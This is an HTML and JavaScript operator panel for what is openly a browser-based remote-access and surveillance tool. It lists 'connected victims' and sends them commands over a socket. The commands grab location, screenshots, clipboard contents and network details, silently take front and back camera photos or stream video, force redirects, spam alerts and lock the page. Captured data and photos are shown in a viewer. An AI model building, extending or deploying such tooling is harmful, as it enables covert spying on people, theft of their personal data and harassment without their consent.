<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff00;
            padding: 20px;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .header h1 {
            color: white;
            font-size: 24px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: #1a1f3a;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #00ff00;
        }
        
        .stat-card h3 {
            color: #00ff00;
            margin-bottom: 10px;
            font-size: 14px;
        }
        
        .stat-card .value {
            font-size: 32px;
            font-weight: bold;
            color: #fff;
        }
        
        .sessions {
            background: #1a1f3a;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #00ff00;
            margin-bottom: 20px;
        }
        
        .sessions h2 {
            margin-bottom: 15px;
            color: #00ff00;
        }
        
        .session-item {
            background: #0a0e27;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            border-left: 4px solid #00ff00;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .session-item:hover {
            background: #1a1f3a;
            transform: translateX(5px);
        }
        
        .session-item.active {
            border-left-color: #ff0000;
            background: #2a1f3a;
        }
        
        .session-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 5px;
        }
        
        .status {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 12px;
            background: #00ff00;
            color: #000;
        }
        
        .status.offline {
            background: #666;
        }
        
        .controls {
            background: #1a1f3a;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #00ff00;
            margin-bottom: 20px;
        }
        
        .controls h2 {
            margin-bottom: 15px;
            color: #00ff00;
        }
        
        .btn-group {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
        }
        
        .cmd-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: transform 0.2s;
        }
        
        .cmd-btn:hover {
            transform: translateY(-2px);
        }
        
        .cmd-btn:active {
            transform: translateY(0);
        }
        
        .data-viewer {
            background: #1a1f3a;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #00ff00;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .data-viewer h2 {
            margin-bottom: 15px;
            color: #00ff00;
        }
        
        .data-item {
            background: #0a0e27;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
            font-size: 12px;
        }
        
        .data-item .timestamp {
            color: #666;
            font-size: 10px;
        }
        
        .log {
            background: #000;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            max-height: 200px;
            overflow-y: auto;
            font-size: 12px;
        }
        
        .log-entry {
            margin-bottom: 5px;
        }
        
        .log-entry.success { color: #00ff00; }
        .log-entry.error { color: #ff0000; }
        .log-entry.info { color: #00aaff; }
    </style>
</head>
<body>
    <div class="header">
        <h1>üïµÔ∏è ADMIN CONTROL PANEL üïµÔ∏è</h1>
        <p style="color: rgba(255,255,255,0.8); margin-top: 5px;">Remote Access Dashboard</p>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <h3>Active Sessions</h3>
            <div class="value" id="activeSessions">0</div>
        </div>
        <div class="stat-card">
            <h3>Total Captured</h3>
            <div class="value" id="totalCaptured">0</div>
        </div>
        <div class="stat-card">
            <h3>Screenshots</h3>
            <div class="value" id="screenshots">0</div>
        </div>
        <div class="stat-card">
            <h3>Locations</h3>
            <div class="value" id="locations">0</div>
        </div>
    </div>
    
    <div class="sessions">
        <h2>üì± Connected Victims</h2>
        <div id="sessionsList">
            <p style="color: #666; text-align: center;">No active sessions. Waiting for connections...</p>
        </div>
    </div>
    
    <div class="controls">
        <h2>üéÆ Command Controls</h2>
        <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
            Select a victim session above, then click a command
        </p>
        <div class="btn-group">
            <button class="cmd-btn" onclick="sendCommand('full_scan')" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">üöÄ FULL SCAN (All Data)</button>
            <button class="cmd-btn" onclick="sendCommand('get_device_info')">üì± Device Info</button>
            <button class="cmd-btn" onclick="sendCommand('get_location')">üìç Get Location</button>
            <button class="cmd-btn" onclick="sendCommand('screenshot')">üì∏ Screenshot</button>
            <button class="cmd-btn" onclick="capturePhoto('user')" style="background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);">üì∑ Capture Front Camera</button>
            <button class="cmd-btn" onclick="capturePhoto('environment')" style="background: linear-gradient(135deg, #30cfd0 0%, #330867 100%);">üì∑ Capture Back Camera</button>
            <button class="cmd-btn" onclick="sendCommand('start_camera', {camera: 'user'})" style="background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%);">üé• Start Front Camera</button>
            <button class="cmd-btn" onclick="sendCommand('stop_camera')" style="background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);">‚èπÔ∏è Stop Camera</button>
            <button class="cmd-btn" onclick="sendCommand('get_clipboard')">üìã Clipboard</button>
            <button class="cmd-btn" onclick="sendCommand('get_battery')">üîã Battery</button>
            <button class="cmd-btn" onclick="sendCommand('get_network')">üì∂ Network Info</button>
            <button class="cmd-btn" onclick="sendCommand('vibrate')">üì≥ Vibrate</button>
            <button class="cmd-btn" onclick="sendCommand('play_sound')">üîä Play Sound</button>
            <button class="cmd-btn" onclick="sendCommand('open_url')">üåê Open URL</button>
            <button class="cmd-btn" onclick="sendCommand('redirect')">üîÑ Redirect</button>
            <button class="cmd-btn" onclick="sendCommand('spam_alert')">‚ö†Ô∏è Spam Alerts</button>
            <button class="cmd-btn" onclick="sendCommand('disable_back')">üö´ Lock Page</button>
        </div>
    </div>
    
    <div class="data-viewer">
        <h2>üìä Captured Data</h2>
        <div id="dataViewer">
            <p style="color: #666; text-align: center;">No data captured yet...</p>
        </div>
    </div>
    
    <div class="log" id="log">
        <div class="log-entry info">[*] Admin panel loaded</div>
        <div class="log-entry info">[*] Waiting for connections...</div>
    </div>

    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script>
        const socket = io();
        let selectedSession = null;
        let sessions = {};
        let capturedData = [];
        
        // Connect to server
        socket.on('connect', () => {
            addLog('Connected to server', 'success');
        });
        
        // New victim connected
        socket.on('victim_connected', (data) => {
            sessions[data.session_id] = data;
            updateSessionsList();
            addLog(`New victim: ${data.ip}`, 'success');
            updateStats();
        });
        
        // Data received from victim
        socket.on('data_received', (data) => {
            capturedData.push(data);
            updateDataViewer();
            addLog(`Received ${data.type} from ${data.session}`, 'success');
            updateStats();
        });
        
        function updateSessionsList() {
            const list = document.getElementById('sessionsList');
            if (Object.keys(sessions).length === 0) {
                list.innerHTML = '<p style="color: #666; text-align: center;">No active sessions...</p>';
                return;
            }
            
            list.innerHTML = Object.entries(sessions).map(([id, session]) => `
                <div class="session-item ${selectedSession === id ? 'active' : ''}" onclick="selectSession('${id}')">
                    <div class="session-info">
                        <strong>${session.ip}</strong>
                        <span class="status ${session.active ? '' : 'offline'}">
                            ${session.active ? 'ONLINE' : 'OFFLINE'}
                        </span>
                    </div>
                    <div style="font-size: 12px; color: #666;">
                        ${session.user_agent.substring(0, 50)}...
                    </div>
                    <div style="font-size: 10px; color: #444; margin-top: 5px;">
                        Connected: ${session.connected_at}
                    </div>
                </div>
            `).join('');
        }
        
        function selectSession(sessionId) {
            selectedSession = sessionId;
            updateSessionsList();
            addLog(`Selected session: ${sessions[sessionId].ip}`, 'info');
        }
        
        function sendCommand(command, params = {}) {
            if (!selectedSession) {
                alert('Please select a victim session first!');
                return;
            }
            
            // Get additional params for some commands
            if (command === 'open_url') {
                params.url = prompt('Enter URL to open:', 'https://google.com');
                if (!params.url) return;
            }
            
            socket.emit('admin_command', {
                session: selectedSession,
                command: command,
                params: params
            });
            
            addLog(`Sent command: ${command} to ${sessions[selectedSession].ip}`, 'info');
        }
        
        function capturePhoto(cameraType) {
            if (!selectedSession) {
                alert('Please select a victim session first!');
                return;
            }
            
            const cameraName = cameraType === 'user' ? 'Front' : 'Back';
            addLog(`Capturing ${cameraName} camera photo...`, 'info');
            
            socket.emit('admin_command', {
                session: selectedSession,
                command: 'capture_photo',
                params: { camera: cameraType }
            });
        }
        
        function updateDataViewer() {
            const viewer = document.getElementById('dataViewer');
            if (capturedData.length === 0) {
                viewer.innerHTML = '<p style="color: #666; text-align: center;">No data captured yet...</p>';
                return;
            }
            
            viewer.innerHTML = capturedData.slice(-10).reverse().map(item => {
                let content = '';
                
                // Special handling for camera photos
                if (item.type === 'camera_photo') {
                    content = `
                        <div class="data-item">
                            <strong style="color: #00ff00;">üì∑ CAMERA PHOTO (${item.data.camera.toUpperCase()})</strong>
                            <span class="timestamp">${item.time}</span>
                            <div style="margin-top: 10px;">
                                <img src="${item.data.image}" style="max-width: 100%; border-radius: 10px; border: 2px solid #00ff00;">
                            </div>
                            <div style="margin-top: 5px; color: #ccc; font-size: 12px;">
                                Resolution: ${item.data.resolution} | Camera: ${item.data.camera}
                            </div>
                        </div>
                    `;
                } else {
                    content = `
                        <div class="data-item">
                            <strong style="color: #00ff00;">${item.type.toUpperCase()}</strong>
                            <span class="timestamp">${item.time}</span>
                            <div style="margin-top: 5px; color: #ccc;">
                                Session: ${item.session.substring(0, 8)}...
                            </div>
                            <div style="margin-top: 5px; color: #fff; word-break: break-all;">
                                ${JSON.stringify(item.data).substring(0, 200)}...
                            </div>
                        </div>
                    `;
                }
                
                return content;
            }).join('');
        }
        
        function updateStats() {
            document.getElementById('activeSessions').textContent = 
                Object.values(sessions).filter(s => s.active).length;
            document.getElementById('totalCaptured').textContent = capturedData.length;
            document.getElementById('screenshots').textContent = 
                capturedData.filter(d => d.type === 'screenshot').length;
            document.getElementById('locations').textContent = 
                capturedData.filter(d => d.type === 'location').length;
        }
        
        function addLog(message, type = 'info') {
            const log = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            const time = new Date().toLocaleTimeString();
            entry.textContent = `[${time}] ${message}`;
            log.appendChild(entry);
            log.scrollTop = log.scrollHeight;
        }
        
        // Load initial data
        fetch('/api/sessions')
            .then(r => r.json())
            .then(data => {
                data.sessions.forEach(session => {
                    sessions[session.id] = session;
                });
                updateSessionsList();
                updateStats();
            });
        
        // Auto refresh every 5 seconds
        setInterval(() => {
            fetch('/api/sessions')
                .then(r => r.json())
                .then(data => {
                    data.sessions.forEach(session => {
                        sessions[session.id] = session;
                    });
                    updateSessionsList();
                });
        }, 5000);
    </script>
</body>
</html>
